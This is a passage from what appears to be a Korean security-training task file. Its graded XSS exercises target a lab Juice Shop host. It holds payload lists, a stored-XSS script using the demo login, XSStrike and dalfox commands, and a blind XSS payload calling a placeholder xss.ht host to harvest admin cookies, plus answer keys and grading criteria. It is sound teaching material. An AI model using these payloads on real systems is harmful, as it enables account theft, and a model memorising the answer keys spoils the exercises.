      - 단순 GET
      - 반사형 맥락 없음
  target_vm: attacker
- order: 2
  instruction: |-
    다양한 XSS 페이로드를 테스트하시오: img, svg, iframe 태그 활용.

    ■ 실습 방법 (페이로드 다양성)

    ▶ 1단계: 도구 A — curl 다양 페이로드 batch
    ```bash
    PAYLOADS=(
      '<img src=x onerror=alert(1)>'
      '<svg onload=alert(1)>'
      '<iframe src="javascript:alert(1)">'
      '<body onload=alert(1)>'
      '<details open ontoggle=alert(1)>'
      '<input autofocus onfocus=alert(1)>'
      '<a href="javascript:alert(1)">click</a>'
      '<marquee onstart=alert(1)>'
      '<video><source onerror=alert(1)>'
      '<audio src=x onerror=alert(1)>'
    )
    for p in "${PAYLOADS[@]}"; do
      ENC=$(printf '%s' "$p" | jq -sRr @uri)
      echo "=== $p ==="
      curl -s "http://10.20.30.80/#/search?q=$ENC" | grep -F "$p" | head -1
    done
    echo "XSS 페이로드 테스트 완료"
    ```

    ▶ 2단계: 도구 B — PayloadsAllTheThings (학습용 wordlist)
    ```bash
    git clone https://github.com/swisskyrepo/PayloadsAllTheThings.git ~/PATT
    # XSS 페이로드 wordlist
    cat ~/PATT/XSS\ Injection/Intruders/IntrudersXSS.txt | head -30
    ```

    ▶ 3단계: 도구 C — XSStrike fuzzing 모드
    ```bash
    cd ~/XSStrike
    python3 xsstrike.py -u "http://10.20.30.80/#/search?q=test" --fuzzer
    # 자체 fuzzer 가 600+ 페이로드 시도
    ```

    ▶ 4단계: 도구 D — OWASP XSS Filter Evasion Cheatsheet
    https://owasp.org/www-community/xss-filter-evasion-cheatsheet
    카테고리:
    - 이벤트 핸들러 (onerror/onload/onfocus/onclick/...)
    - JavaScript URI (javascript:/data:)
    - HTML5 새 태그 (details/summary/marquee/audio/video)
    - SVG / MathML
    - 인코딩 (HTML entity / URL / Unicode / hex)

    ▶ 5단계: 답변
    성공한 페이로드 2~3개 + 응답에서 반사된 코드 quote + 카테고리 분류 (이벤트 핸들러/URI/HTML5).
  hint: 'curl batch / PayloadsAllTheThings / XSStrike --fuzzer / OWASP XSS Cheatsheet.'
  category: xss_reflected
  points: 10
  answer: curl -s 'http://10.20.30.80/#/search?q=<img src=x onerror=alert(1)>' 2>/dev/null
    | head -10 && echo 'XSS 페이로드 테스트 완료'
  answer_detail: 'img onerror, svg onload, iframe src=javascript: 등 다양한 벡터가 존재합니다.'
  verify:
    type: output_contains
    expect: XSS 페이로드 테스트 완료
    field: stdout
    semantic:
      intent: 다양한 XSS 페이로드 — <img src=x onerror=alert(1)> + <svg onload> + <iframe
        src=javascript:>. <script> 차단 시 이벤트 핸들러 우회. OWASP XSS Filter Evasion Cheatsheet.
      success_criteria:
      - img/svg/iframe 페이로드
      - XSS 페이로드 키워드
      - 이벤트 핸들러
      acceptable_methods:
      - 수동 페이로드
      - PortSwigger XSS Cheatsheet
      - BeEF 프레임워크
      negative_signs:
      - <script>만
      - 이벤트 핸들러 없음
      - 변형 페이로드 누락
  target_vm: attacker
- order: 3
  instruction: |-
    저장형 XSS를 시도하시오: 상품 리뷰에 스크립트를 삽입.

    ■ 실습 방법 (Stored XSS — 2 단계: 저장 + 트리거)

    ▶ 1단계: 도구 A — curl 2 단계 (저장 → 다른 사용자 시점 재현)
    ```bash
    # 1. 인증 토큰 얻기
    TOKEN=$(curl -s -X POST http://10.20.30.80/rest/user/login \
      -H 'Content-Type: application/json' \
      -d '{"email":"jim@juice-sh.op","password":"ncc-1701"}' | jq -r '.authentication.token')
    echo "TOKEN: $TOKEN"

    # 2. 페이로드 저장 (리뷰 작성)
    curl -s -X PUT http://10.20.30.80/rest/products/1/reviews \
      -H "Authorization: Bearer $TOKEN" \
      -H 'Content-Type: application/json' \
      -d '{"message":"<script>alert(\"stored XSS\")</script>","author":"hacker@x.com"}'

    # 3. 다른 사용자가 페이지 보면 트리거 (다시 GET)
    curl -s "http://10.20.30.80/rest/products/1/reviews" | jq '.data[].message' | head -5
    echo "저장형 XSS 테스트 완료"
    ```

    ▶ 2단계: 도구 B — XSStrike --crawl (사이트 전체 stored XSS 자동 점검)
    ```bash
    cd ~/XSStrike
    python3 xsstrike.py -u "http://10.20.30.80" --crawl --headers "Authorization: Bearer $TOKEN"
    ```

    ▶ 3단계: 도구 C — dalfox + Stored XSS 모드
    ```bash
    dalfox url "http://10.20.30.80/rest/products/1/reviews" \
           --method PUT \
           --header "Authorization: Bearer $TOKEN" \
           --data '{"message":"PAYLOAD"}' \
           --custom-payload ~/XSStrike/db/jsBuilders.txt
    ```

    ▶ 4단계: 도구 D — XSS Hunter (out-of-band stored XSS 탐지)
    설치: 자체 호스팅 또는 https://xsshunter.com 가입 후 ID 발급. 사용:
    ```bash
    # 페이로드: <script src=https://YOUR_ID.xss.ht></script>
    # 또는 OOB blind XSS:
    curl -s -X PUT http://10.20.30.80/rest/products/1/reviews \
      -H "Authorization: Bearer $TOKEN" \
      -d '{"message":"<script src=https://yoursubdomain.xss.ht></script>"}'
    # 관리자가 페이지 열면 → XSS Hunter 가 쿠키/screenshot/URL 자동 수집
    ```

    ▶ 5단계: 답변
    저장 응답 + 재요청 응답에 페이로드 그대로 노출 1줄 quote + Stored vs Reflected 차이 1 문장.
  hint: 'curl 2 단계 / XSStrike --crawl 자동 / dalfox PUT / XSS Hunter blind OOB.'
  category: xss_stored
  points: 12
  answer: "curl -s -X POST http://10.20.30.80/api/Feedbacks \\\n  -H 'Content-Type:\
    \ application/json' \\\n  -d '{\"comment\":\"<script>alert(document.cookie)</script>\"\
    ,\"rating\":5}' 2>/dev/null \\\n | head -10 && echo '저장형 XSS 테스트 완료'"
  answer_detail: 저장형 XSS는 DB에 저장되어 다른 사용자가 페이지를 볼 때마다 실행되므로 더 위험합니다.
  verify:
    type: output_contains
    expect:
    - 저장형 XSS 테스트 완료
    - alert
    field: stdout
    semantic:
      intent: '저장형 XSS — curl POST /api/Feedbacks -d {comment: <script>alert(document.cookie)</script>}.
        DB 저장 → 다른 사용자 페이지 로드 시 매번 실행. 반사형보다 위험. OWASP A03 Stored.'
      success_criteria:
      - 저장형 XSS 키워드
      - POST + 저장 가능 엔드포인트
      - <script> 또는 페이로드
      acceptable_methods:
      - POST /api/Feedbacks
      - 리뷰/댓글 저장
      - Burp Repeater POST
      negative_signs:
